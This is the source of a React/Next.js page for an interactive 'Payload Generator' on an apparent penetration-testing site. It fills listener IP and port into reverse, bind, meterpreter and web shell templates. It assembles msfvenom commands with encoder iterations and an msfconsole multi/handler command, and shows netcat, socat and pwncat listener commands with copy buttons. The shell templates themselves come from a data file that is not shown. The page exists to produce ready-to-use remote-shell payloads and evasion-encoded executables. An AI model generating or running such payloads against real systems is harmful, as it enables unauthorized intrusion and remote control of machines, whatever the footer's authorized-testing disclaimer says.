"use client"

import Link from "next/link"
import { useState, useMemo, useCallback } from "react"
import {
  payloadTemplates, msfVenomPayloads, listenerCommands, encoderOptions,
  shellTypeMeta, type ShellType,
} from "@/lib/payload-data"
import { Terminal, Copy, Check, Shield, Network } from "lucide-react"

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)

  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }, [text])

  return (
    <button onClick={handleCopy} className={`network-copy-btn ${copied ? "copied" : ""}`}>
      {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
      {copied ? "Copied" : "Copy"}
    </button>
  )
}

function CommandBlock({ cmd, note }: { cmd: string; note?: string }) {
  return (
    <div className="mb-2">
      <div className="flex items-start gap-2">
        <code className="network-command-block flex-1 text-xs leading-relaxed">{cmd}</code>
        <CopyButton text={cmd} />
      </div>
      {note && <p className="mt-1 text-xs" style={{ color: "var(--network-text-muted)" }}>{note}</p>}
    </div>
  )
}

export default function PayloadsPage() {
  const [ip, setIp] = useState("192.168.1.100")
  const [port, setPort] = useState("4444")
  const [shellType, setShellType] = useState<ShellType>("reverse")
  const [languageFilter, setLanguageFilter] = useState("All")
  const [platformFilter, setPlatformFilter] = useState<"all" | "linux" | "windows">("all")
  const [selectedMsfPayload, setSelectedMsfPayload] = useState(msfVenomPayloads[0])
  const [encoder, setEncoder] = useState("none")
  const [iterations, setIterations] = useState("1")

  const ipPlaceholders = ["192.168.1.100", "10.10.14.5", "172.16.1.50", "127.0.0.1"]
  const targetIpPlaceholders = ["10.10.14.5", "192.168.1.100", "172.16.1.50", "10.0.0.1"]
  const portPlaceholders = ["4444", "9001", "1337", "443", "80", "8080"]

  const filteredPayloads = useMemo(() => {
    return payloadTemplates.filter((p) => {
      if (p.shellType !== shellType) return false
      if (languageFilter !== "All" && p.language !== languageFilter) return false
      if (platformFilter !== "all" && p.platform !== "cross-platform" && p.platform !== platformFilter) return false
      return true
    })
  }, [shellType, languageFilter, platformFilter])

  const availableLanguages = useMemo(() => {
    const langs = payloadTemplates
      .filter((p) => p.shellType === shellType)
      .map((p) => p.language)
    return ["All", ...new Set(langs)].sort()
  }, [shellType])

  function fillTemplate(template: string): string {
    let result = template.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port)
    result = result.replace(/\{PORT_2\}/g, String(Number(port) + 1))
    result = result.replace(/\{PASSWORD\}/g, "p@ssw0rd")
    return result
  }

  const filteredListeners = useMemo(() => {
    const modeIds: Record<ShellType, string[]> = {
      reverse: ["listener-nc", "listener-nc-ssl", "listener-msf-handler", "listener-socat", "listener-pwncat", "listener-python-http"],
      bind: ["connect-nc", "connect-ncat-ssl", "connect-socat", "connect-pwncat"],
      meterpreter: ["listener-msf-handler"],
      web: ["access-curl", "access-browser"],
    }
    const ids = modeIds[shellType] || modeIds.reverse
    return listenerCommands.filter((l) => ids.includes(l.id))
  }, [shellType])

  const encoderList = useMemo(() => {
    const payload = msfVenomPayloads.find((p) => p.id === selectedMsfPayload.id)
    return encoderOptions.filter((e) => {
      if (e.name === "generic/none") return true
      return e.validArches.includes(payload?.arch ?? "")
    })
  }, [selectedMsfPayload])

  function buildMsfVenomCommand(): string {
    let cmd = "msfvenom"
    cmd += ` -p ${selectedMsfPayload.payload}`
    cmd += ` LHOST=${ip} LPORT=${port}`
    cmd += ` -f ${selectedMsfPayload.format}`
    cmd += ` -o /tmp/payload.${selectedMsfPayload.format === "exe" ? "exe" : selectedMsfPayload.format}`
    if (encoder !== "generic/none" && encoder !== "none") {
      cmd += ` -e ${encoder}`
      cmd += ` -i ${iterations}`
    }
    return cmd
  }

  function buildHandlerCommand(): string {
    return `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ${selectedMsfPayload.payload}; set LHOST ${ip}; set LPORT ${port}; exploit'`
  }

  return (
    <div className="min-h-screen">
      {/* Nav */}
      <nav className="sticky top-0 z-50 flex h-12 items-center justify-between border-b px-6" style={{ background: "var(--network-bg)", borderColor: "var(--network-border)" }}>
        <Link href="/network" className="flex items-center gap-2 text-sm font-bold tracking-wider" style={{ color: "var(--network-primary)" }}>
          <Terminal className="h-4 w-4" /> NETWORK
        </Link>
        <div className="flex items-center gap-5 text-sm">
          <Link href="/" className="transition-colors hover:text-white" style={{ color: "var(--network-text-muted)" }}>
            &larr; Main Site
          </Link>
          <Link href="/network/ports" className="transition-colors hover:text-white" style={{ color: "var(--network-text-muted)" }}>
            Ports
          </Link>
          <span style={{ color: "var(--network-text)" }}>Payloads</span>
          <Link href="/network/wireless" className="transition-colors hover:text-white" style={{ color: "var(--network-text-muted)" }}>
            Wireless
          </Link>
          <Link href="/network/resources" className="transition-colors hover:text-white" style={{ color: "var(--network-text-muted)" }}>
            Resources
          </Link>
        </div>
      </nav>

      {/* Header */}
      <section className="border-b px-6 py-16 text-center" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-2xl" style={{ background: "var(--network-primary-glow)", border: "1px solid var(--network-primary-dim)" }}>
          <Terminal className="h-7 w-7" style={{ color: "var(--network-primary)" }} />
        </div>
        <h1 className="mb-3 text-3xl font-bold tracking-wider sm:text-4xl" style={{ color: "var(--network-primary)" }}>
          PAYLOAD GENERATOR
        </h1>
        <p className="mx-auto max-w-xl text-sm" style={{ color: "var(--network-text-secondary)" }}>
          Interactive payload builder — fill in your listener details and copy ready-to-use commands.
        </p>
      </section>

      {/* Input Section */}
      <section className="border-b px-6 py-8" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto flex max-w-3xl flex-wrap items-end gap-4">
          <div className="flex-1">
            <label className="mb-1.5 block text-xs font-semibold tracking-wider" style={{ color: "var(--network-text-muted)" }}>
              {shellType === "bind" ? "TARGET IP" : "LISTENER IP"}
            </label>
            <div className="flex gap-1">
              <input
                type="text"
                value={ip}
                onChange={(e) => setIp(e.target.value)}
                className="network-command-block flex-1 bg-transparent px-3 py-2 text-sm font-mono outline-none"
                style={{ background: "var(--network-card-bg)" }}
              />
            </div>
            <div className="mt-1.5 flex gap-1.5">
              {(shellType === "bind" ? targetIpPlaceholders : ipPlaceholders).map((p) => (
                <button key={p} onClick={() => setIp(p)}
                  className="rounded px-2 py-0.5 text-xs font-mono transition-colors hover:text-white"
                  style={{ background: "var(--network-primary-glow)", color: "var(--network-primary)" }}>
                  {p}
                </button>
              ))}
            </div>
          </div>
          <div className="w-28">
            <label className="mb-1.5 block text-xs font-semibold tracking-wider" style={{ color: "var(--network-text-muted)" }}>PORT</label>
            <input
              type="text"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              className="network-command-block w-full bg-transparent px-3 py-2 text-sm font-mono outline-none"
              style={{ background: "var(--network-card-bg)" }}
            />
            <div className="mt-1.5 flex gap-1.5">
              {portPlaceholders.map((p) => (
                <button key={p} onClick={() => setPort(p)}
                  className="rounded px-2 py-0.5 text-xs font-mono transition-colors hover:text-white"
                  style={{ background: "var(--network-primary-glow)", color: "var(--network-primary)" }}>
                  {p}
                </button>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* Shell Type Tabs */}
      <section className="border-b px-6 py-6" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto max-w-5xl">
          <div className="mb-6 flex flex-wrap gap-2">
            {(Object.entries(shellTypeMeta) as [ShellType, typeof shellTypeMeta[ShellType]][]).map(([key, meta]) => (
              <button
                key={key}
                onClick={() => setShellType(key)}
                className={`rounded-lg border px-4 py-2 text-xs font-semibold tracking-wider transition-colors ${
                  shellType === key ? "border-transparent" : "border-transparent hover:border-opacity-50"
                }`}
                style={{
                  background: shellType === key ? "var(--network-primary)" : "var(--network-card-bg)",
                  color: shellType === key ? "var(--network-bg)" : "var(--network-text)",
                  borderColor: shellType === key ? "var(--network-primary)" : "var(--network-border)",
                }}
              >
                {meta.label}
              </button>
            ))}
          </div>

          <div className="flex flex-wrap items-center gap-4">
            {/* Platform filter */}
            <div className="flex items-center gap-2">
              <span className="text-xs tracking-wider" style={{ color: "var(--network-text-muted)" }}>Platform:</span>
              {(["all", "linux", "windows"] as const).map((pf) => (
                <button
                  key={pf}
                  onClick={() => setPlatformFilter(pf)}
                  className="rounded px-3 py-1 text-xs font-mono transition-colors"
                  style={{
                    background: platformFilter === pf ? "var(--network-primary-glow)" : "transparent",
                    color: platformFilter === pf ? "var(--network-primary)" : "var(--network-text-muted)",
                  }}
                >
                  {pf === "all" ? "All" : pf === "linux" ? "Linux" : "Windows"}
                </button>
              ))}
            </div>

            {/* Language filter */}
            <div className="flex items-center gap-2">
              <span className="text-xs tracking-wider" style={{ color: "var(--network-text-muted)" }}>Language:</span>
              <select
                value={languageFilter}
                onChange={(e) => setLanguageFilter(e.target.value)}
                className="rounded border px-3 py-1 text-xs font-mono outline-none"
                style={{ background: "var(--network-card-bg)", color: "var(--network-text)", borderColor: "var(--network-border)" }}
              >
                {availableLanguages.map((lang) => (
                  <option key={lang} value={lang}>{lang}</option>
                ))}
              </select>
            </div>

            {/* Count */}
            <span className="text-xs" style={{ color: "var(--network-text-muted)" }}>
              {filteredPayloads.length} result{filteredPayloads.length !== 1 ? "s" : ""}
            </span>
          </div>
        </div>
      </section>

      {/* Generated Payloads */}
      <section className="border-b px-6 py-8" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto max-w-3xl">
          <div className="mb-4 flex items-center gap-2">
            <Terminal className="h-4 w-4" style={{ color: "var(--network-primary)" }} />
            <h2 className="text-sm font-semibold tracking-wider" style={{ color: "var(--network-primary)" }}>GENERATED COMMANDS — {shellTypeMeta[shellType].label.toUpperCase()}</h2>
          </div>
          <p className="mb-4 text-xs" style={{ color: "var(--network-text-secondary)" }}>{shellTypeMeta[shellType].description}</p>

          <div className="space-y-1">
            {filteredPayloads.length === 0 && (
              <p className="py-8 text-center text-xs" style={{ color: "var(--network-text-muted)" }}>
                No payloads match the current filters. Try a different shell type or platform.
              </p>
            )}
            {filteredPayloads.map((p) => (
              <CommandBlock key={p.id} cmd={fillTemplate(p.template)} note={p.description + (p.usageNote ? ` — ${p.usageNote}` : "")} />
            ))}
          </div>
        </div>
      </section>

      {/* Meterpreter section */}
      {shellType === "meterpreter" && (
        <>
          {/* MSFVenom Generator */}
          <section className="border-b px-6 py-8" style={{ borderColor: "var(--network-border)" }}>
            <div className="mx-auto max-w-3xl">
              <div className="mb-4 flex items-center gap-2">
                <Shield className="h-4 w-4" style={{ color: "var(--network-primary)" }} />
                <h2 className="text-sm font-semibold tracking-wider" style={{ color: "var(--network-primary)" }}>MSFVENOM PAYLOAD BUILDER</h2>
              </div>

              {/* Payload selector */}
              <div className="mb-4 grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
                {msfVenomPayloads.map((mp) => (
                  <button
                    key={mp.id}
                    onClick={() => setSelectedMsfPayload(mp)}
                    className="rounded-lg border p-3 text-left transition-colors"
                    style={{
                      background: selectedMsfPayload.id === mp.id ? "var(--network-primary-glow)" : "var(--network-card-bg)",
                      borderColor: selectedMsfPayload.id === mp.id ? "var(--network-primary-dim)" : "var(--network-border)",
                    }}
                  >
                    <div className="text-xs font-bold font-mono" style={{ color: "var(--network-primary)" }}>{mp.name}</div>
                    <div className="mt-1 text-[10px]" style={{ color: "var(--network-text-muted)" }}>
                      {mp.payload} &middot; {mp.format}
                    </div>
                  </button>
                ))}
              </div>

              {/* Encoder options */}
              <div className="mb-4 flex flex-wrap items-center gap-4">
                <div className="flex items-center gap-2">
                  <span className="text-xs tracking-wider" style={{ color: "var(--network-text-muted)" }}>Encoder:</span>
                  <select
                    value={encoder}
                    onChange={(e) => setEncoder(e.target.value)}
                    className="rounded border px-3 py-1 text-xs font-mono outline-none"
                    style={{ background: "var(--network-card-bg)", color: "var(--network-text)", borderColor: "var(--network-border)" }}
                  >
                    {encoderList.map((e) => (
                      <option key={e.name} value={e.name}>{e.name} — {e.description}</option>
                    ))}
                  </select>
                </div>
                {encoder !== "none" && encoder !== "generic/none" && (
                  <div className="flex items-center gap-2">
                    <span className="text-xs tracking-wider" style={{ color: "var(--network-text-muted)" }}>Iterations:</span>
                    <input
                      type="number"
                      value={iterations}
                      onChange={(e) => setIterations(e.target.value)}
                      min="1"
                      max="50"
                      className="w-16 rounded border px-2 py-1 text-xs font-mono outline-none"
                      style={{ background: "var(--network-card-bg)", color: "var(--network-text)", borderColor: "var(--network-border)" }}
                    />
                  </div>
                )}
              </div>

              {/* Generated MSFVenom command */}
              <div className="mb-2">
                <div className="mb-1 text-xs font-semibold tracking-wider" style={{ color: "var(--network-text-secondary)" }}>Generate payload:</div>
                <CommandBlock cmd={buildMsfVenomCommand()} note={`Generates a ${selectedMsfPayload.format} payload for ${selectedMsfPayload.arch === "n/a" ? "any" : selectedMsfPayload.arch} architecture`} />
              </div>
              <div>
                <div className="mb-1 text-xs font-semibold tracking-wider" style={{ color: "var(--network-text-secondary)" }}>Start listener:</div>
                <CommandBlock cmd={buildHandlerCommand()} note="Replace with the corresponding listener on your attack machine" />
              </div>
            </div>
          </section>
        </>
      )}

      {/* Listener / Connection / Access Setup */}
      <section className="border-b px-6 py-8" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto max-w-3xl">
          <div className="mb-4 flex items-center gap-2">
            <Network className="h-4 w-4" style={{ color: "var(--network-primary)" }} />
            <h2 className="text-sm font-semibold tracking-wider" style={{ color: "var(--network-primary)" }}>
              {shellType === "bind" ? "CONNECTION COMMAND" : shellType === "web" ? "ACCESS COMMAND" : "LISTENER SETUP"}
            </h2>
          </div>
          <p className="mb-4 text-xs" style={{ color: "var(--network-text-secondary)" }}>
            {shellType === "bind"
              ? "The target is now listening — connect to it from your attack machine:"
              : shellType === "web"
                ? "Upload the web shell to the target, then access it via browser or curl:"
                : "Start a listener on your attack machine to catch incoming shells. Replace {PAYLOAD} with your Metasploit payload type when using the handler."}
          </p>
          <div className="space-y-1">
            {filteredListeners.map((l) => {
              let command = l.command
                .replace(/\{IP\}/g, ip)
                .replace(/\{PORT\}/g, port)
              if (l.id === "listener-msf-handler") {
                command = l.command
                  .replace(/\{IP\}/g, ip)
                  .replace(/\{PORT\}/g, port)
                  .replace(/\{PAYLOAD\}/g, selectedMsfPayload.payload)
              }
              return (
                <CommandBlock key={l.id} cmd={command} note={l.description} />
              )
            })}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t px-6 py-8 text-center" style={{ borderColor: "var(--network-border)" }}>
        <div className="mx-auto mb-6 h-px max-w-md" style={{ background: "linear-gradient(90deg, transparent, var(--network-primary-dim), transparent)" }} />
        <p className="mb-4 text-xs" style={{ color: "var(--network-text-muted)" }}>For authorized security testing only. Use responsibly.</p>
        <Link href="/network" className="inline-flex items-center gap-1 text-xs transition-colors" style={{ color: "var(--network-primary)" }}>
          <Terminal className="h-3 w-3" /> Back to Network Lab
        </Link>
      </footer>
    </div>
  )
}
